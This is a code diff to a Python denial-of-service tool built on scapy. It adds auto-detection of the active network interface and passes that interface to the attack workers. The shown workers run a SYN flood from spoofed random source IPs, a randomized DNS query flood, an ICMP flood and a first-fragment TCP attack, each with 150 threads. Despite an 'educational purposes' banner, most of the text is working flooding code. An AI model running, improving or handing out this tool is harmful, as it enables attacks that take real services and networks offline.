@@ -13,6 +13,7 @@ from scapy.volatile import RandString
 import h2.connection
 import h2.events
 import socks
+import netifaces # NEW: Import the netifaces library
 
 # ==============================================================================
 # WARNING: This is a Denial of Service (DoS) script for educational purposes.
@@ -51,8 +52,34 @@ def generate_random_ip():
             return ip
 
 
-# --- 2. ADAPTIVE ATTACK CONTROLLER MODULE ---
+def auto_detect_interface():
+    """
+    Automatically detects the network interface used for the default route (internet).
 
+    :return: The name of the interface (e.g., "en0", "eth0"), or None if not found.
+    """
+    try:
+        # The gateways() function gives us the default gateways for each address family.
+        gws = netifaces.gateways()
+
+        # We are interested in the default IPv4 gateway.
+        default_gateway_info = gws.get('default', {}).get(netifaces.AF_INET)
+
+        if default_gateway_info:
+            # The result is a tuple: (gateway_ip, interface_name)
+            interface_name = default_gateway_info[1]
+            print(f"[INFO] Auto-detected active network interface: {interface_name}")
+            return interface_name
+        else:
+            print("[WARN] Could not auto-detect the default network interface.")
+            return None
+
+    except Exception as e:
+        print(f"[WARN] Error while detecting network interface: {e}")
+        return None
+
+
+# --- 2. ADAPTIVE ATTACK CONTROLLER MODULE ---
 def check_service_status(target_ip, port, timeout=2):
     """Checks if a TCP service is online by attempting to connect to a port."""
     try:
@@ -134,7 +161,7 @@ def attack_udp(method, target_url, port, duration, stop_event, pause_event, thre
 
 
 # --- SYN Flood ---
-def syn_worker(stop_event, pause_event, target_ip, port):
+def syn_worker(stop_event, pause_event, target_ip, port, iface):
     """Worker thread that sends a continuous stream of spoofed SYN packets."""
     while not stop_event.is_set():
         if pause_event.is_set():
@@ -142,12 +169,12 @@ def syn_worker(stop_event, pause_event, target_ip, port):
             continue
         try:
             spoofed_ip = generate_random_ip()
-            send(IP(src=spoofed_ip, dst=target_ip) / TCP(dport=port, sport=RandShort(), flags="S"), verbose=0)
+            send(IP(src=spoofed_ip, dst=target_ip) / TCP(dport=port, sport=RandShort(), flags="S"), verbose=0, iface=iface)
         except Exception:
             pass
 
 
-def synflood(target_url, port, duration, stop_event, pause_event, threads=150):
+def synflood(target_url, port, duration, stop_event, pause_event, threads=150, iface=None):
     """Controller for SYN flood attacks."""
     ips = resolve_to_ipv4(target_url)
     if not ips:
@@ -158,7 +185,7 @@ def synflood(target_url, port, duration, stop_event, pause_event, threads=150):
 
     for ip in ips:
         for _ in range(threads):
-            t = threading.Thread(target=syn_worker, args=(stop_event, pause_event, ip, port))
+            t = threading.Thread(target=syn_worker, args=(stop_event, pause_event, ip, port, iface))
             t.daemon = True
             t.start()
             all_threads.append(t)
@@ -172,7 +199,7 @@ def synflood(target_url, port, duration, stop_event, pause_event, threads=150):
 # --- NEW: DNS Query Flood Worker ---
 # This is a Layer 7 DNS attack. It sends valid, but randomized and non-existent,
 # DNS queries to force the target DNS server to perform expensive lookups.
-def dns_query_worker(stop_event, pause_event, target_ip, target_domain):
+def dns_query_worker(stop_event, pause_event, target_ip, target_domain, iface):
     """Worker thread that sends a continuous stream of randomized DNS queries."""
     while not stop_event.is_set():
         if pause_event.is_set():
@@ -190,14 +217,14 @@ def dns_query_worker(stop_event, pause_event, target_ip, target_domain):
             packet = IP(dst=target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=full_domain))
 
             # Send the packet. verbose=0 prevents flooding our own console.
-            send(packet, verbose=0)
+            send(packet, verbose=0, iface=iface)
         except Exception:
             # If sending fails for any reason, just continue
             pass
 
 
 # --- NEW: DNS Query Flood Controller ---
-def attack_dns_query_flood(target_domain, duration, stop_event, pause_event, threads=150):
+def attack_dns_query_flood(target_domain, duration, stop_event, pause_event, threads=150, iface=None):
     """Controller for DNS Query Flood attacks."""
     ips = resolve_to_ipv4(target_domain)
     if not ips:
@@ -206,7 +233,7 @@ def attack_dns_query_flood(target_domain, duration, stop_event, pause_event, thr
     attack_end_time = time.time() + duration
     for ip in ips:
         for _ in range(threads):
-            t = threading.Thread(target=dns_query_worker, args=(stop_event, pause_event, ip, target_domain))
+            t = threading.Thread(target=dns_query_worker, args=(stop_event, pause_event, ip, target_domain, iface))
             t.daemon = True
             t.start()
 
@@ -216,19 +243,19 @@ def attack_dns_query_flood(target_domain, duration, stop_event, pause_event, thr
 
 
 # --- ICMP Flood ---
-def icmp_worker(stop_event, pause_event, target_ip):
+def icmp_worker(stop_event, pause_event, target_ip, iface):
     """Worker thread that sends a continuous stream of ICMP packets."""
     while not stop_event.is_set():
         if pause_event.is_set():
             time.sleep(1)
             continue
         try:
-            send(IP(dst=target_ip) / ICMP(), verbose=0)
+            send(IP(dst=target_ip) / ICMP(), verbose=0, iface=iface)
         except Exception:
             pass
 
 
-def icmpflood(target_url, duration, stop_event, pause_event, threads=150):
+def icmpflood(target_url, duration, stop_event, pause_event, threads=150, iface=None):
     """Controller for ICMP flood attacks."""
     ips = resolve_to_ipv4(target_url)
     if not ips:
@@ -239,7 +266,7 @@ def icmpflood(target_url, duration, stop_event, pause_event, threads=150):
 
     for ip in ips:
         for _ in range(threads):
-            t = threading.Thread(target=icmp_worker, args=(stop_event, pause_event, ip))
+            t = threading.Thread(target=icmp_worker, args=(stop_event, pause_event, ip, iface))
             t.daemon = True
             t.start()
             all_threads.append(t)
@@ -455,7 +482,7 @@ def attack_h2_rapid_reset(target_url, port, duration, stop_event, pause_event, t
 # --- CORRECTED: TCP Fragmentation Attack Worker ---
 # This version explicitly creates the bytes payload to satisfy type checkers
 # and make the code clearer, resolving the warning from the image.
-def tcp_fragmentation_worker(stop_event, pause_event, target_ip, port):
+def tcp_fragmentation_worker(stop_event, pause_event, target_ip, port, iface):
     """Worker thread that sends a continuous stream of initial TCP fragments."""
     while not stop_event.is_set():
         if pause_event.is_set():
@@ -479,7 +506,7 @@ def tcp_fragmentation_worker(stop_event, pause_event, target_ip, port):
             fragments = fragment(packet, fragsize=512)
 
             # The core of the attack: send only the FIRST fragment.
-            send(fragments[0], verbose=0)
+            send(fragments[0], verbose=0, iface=iface)
 
         except Exception:
             pass
@@ -487,7 +514,7 @@ def tcp_fragmentation_worker(stop_event, pause_event, target_ip, port):
 
 # --- REFACTORED AND NEW ATTACK CONTROLLERS ---
 # --- NEW: TCP Fragmentation Attack Controller ---
-def attack_tcp_fragmentation(target_url, port, duration, stop_event, pause_event, threads=150):
+def attack_tcp_fragmentation(target_url, port, duration, stop_event, pause_event, threads=150, iface=None):
     """Controller for TCP Fragmentation attacks."""
     ips = resolve_to_ipv4(target_url)
     if not ips:
@@ -496,7 +523,7 @@ def attack_tcp_fragmentation(target_url, port, duration, stop_event, pause_event
     attack_end_time = time.time() + duration
     for ip in ips:
         for _ in range(threads):
-            t = threading.Thread(target=tcp_fragmentation_worker, args=(stop_event, pause_event, ip, port))
+            t = threading.Thread(target=tcp_fragmentation_worker, args=(stop_event, pause_event, ip, port, iface))
             t.daemon = True
             t.start()
 
